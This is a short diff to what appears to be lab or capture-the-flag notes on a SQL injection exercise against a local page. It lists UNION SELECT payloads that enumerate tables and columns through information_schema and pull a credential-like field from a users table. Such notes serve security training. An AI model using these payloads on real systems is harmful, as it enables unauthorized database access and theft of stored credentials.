@@ -2,6 +2,10 @@ Page : http://localhost:8080/index.php?page=member
 
 To get tables names => 
 1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables
+
+To get column names from all tables
+1 or 1=2 UNION select table_name, column_name FROM information_schema.columns
+
 To request on the SQL_INJECTION Table =>
 1 AND 1=2 UNION SELECT Countersign, COMMENTAIRE FROM Member_Sql_Injection.users 
 
